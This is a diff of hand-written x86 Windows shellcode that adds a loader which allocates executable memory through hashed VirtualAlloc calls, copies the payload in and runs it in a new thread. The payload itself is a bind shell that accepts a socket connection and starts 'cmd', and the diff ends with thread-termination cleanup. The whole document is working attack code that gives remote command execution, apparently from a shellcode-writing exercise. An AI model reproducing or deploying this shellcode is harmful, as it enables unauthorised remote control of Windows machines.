@@ -3,26 +3,53 @@
 global _start
 
 _start:
+
 cld				; clear direction flag
-prep_shellcode_addr:
-        xor eax,eax
-        FLDZ
-        FSTENV [esp - 0xC]
-        pop ecx
-        mov al,0x1e
-        add ecx,eax
+;LPVOID WINAPI VirtualAlloc(  _In_opt_  LPVOID lpAddress,  _In_      SIZE_T dwSize,  _In_      DWORD flAllocationType,  _In_      DWORD flProtect)
+;VirtualAlloc	0x54CAAF91
+xor eax,eax
+mov esi,0x159			; shellcode size
+push byte 0x40			; 0x40 PAGE_READ/WRITE_EXECUTE
+push 0x1000			; MEM_COMMIT
+push esi			; PUSH SIZE
+push eax			; address = NULL
+push 0x91AFCA54
+call api_call
+
+mov edx,eax			; edx = &memory
+mov edi,eax			; prepare edi with memory address for rep movsb
+mov ecx,esi			; put size in ecx
+
+call payload
+save:
+pop esi				;save address of payload in memory
+rep movsb			; move bytes from address at esi to addr at edi untill ecx is zero
+call thread			;
+
+
+thread:
 ;CreateThread(lpthreadatrributes,dwstacksize,lpstartaddress,lpparameter,dwcreateionflag,lpthreadid)
 ;CreateThread(*SECURITY_ATTRIBUTES,0,address of accept,0,0,NULL)
         xor eax,eax
+	push dword [fs:eax]
+	mov [fs:eax],esp
         push eax                ; lpthreadid = NULL
         push eax                ; dwcreationflag = 0
         push eax                ; lpparameter = NULL
-        push ecx                ; lpstartaddress
+        push edx                ; lpstartaddress
         push eax                ; dwstacksize
         push eax                ; pointer to SECURITY_ATTRIBUTES STRUCT
         push 0xCA2BD06B         ; push hash of createthread()
         call api_call           ; call createthread()
-pop eax
+	pop eax
+	pop eax
+	pop eax
+	sub esp,44
+
+jmp exit
+;pop eax
+payload:
+call save
 cld
 call start
 ; Input: The hash of the API to call and all its parameters must be pushed onto stack.
@@ -173,7 +200,9 @@ start:
 	push ecx		; *output struct
 	push esi		; socket file descriptor
 	push 0x498649E5	; push accept() function hash
+	;INT3
 	call ebp		; call accept()
+	;INT3
 	mov esi,eax		; save the client file descriptor in esi
 ; put "cmd" on stack
 	mov eax,0x646d6301	; mov "cmd01" to eax
@@ -223,4 +252,15 @@ start:
 ;exitprocess	0x7ED8E273
 ;	push 0x73E2D87E
 ;	call ebp
-	
+;0xE4CFCDE8              GetCurrentThread
+push 0xE8CDCFE4		; GetCuurentThread() hash	
+call ebp		; call it current thread handle is in eax
+;0x896F01BD              TerminateThread
+xor ecx,ecx		; zero out ecx
+push ecx		; dw milliseconds = 0
+push eax		; push current thread handle
+push 0xBD016F89		; push TerminateThread() hash
+call ebp		; call TerminateThread(handle,dwmilliseconds)
+nop
+nop
+exit:
